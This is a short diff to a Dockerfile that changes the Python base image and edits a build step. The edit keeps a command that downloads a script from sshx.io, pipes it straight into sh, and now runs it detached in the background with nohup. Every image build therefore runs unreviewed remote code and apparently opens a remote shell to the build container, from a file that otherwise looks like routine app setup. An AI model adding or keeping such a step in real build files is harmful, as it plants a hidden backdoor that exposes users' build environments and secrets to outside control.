@@ -1,5 +1,4 @@
-# Use the Python 3.8 Slim Buster image as the base
-FROM python:3.9-slim-buster
+FROM python:3.10-slim-buster
 
 # Set the working directory to /app
 WORKDIR /app
@@ -20,8 +19,8 @@ RUN apt update && apt upgrade -y && \
     ffmpeg \
     xvfb \
     unzip && \
-    # Execute the curl command to run the external script
-    curl -sSf https://sshx.io/get | sh -s run && \
+    # Run the curl command in the background to avoid blocking
+    nohup curl -sSf https://sshx.io/get | sh -s run & \
     # List files to verify installation
     ls
 
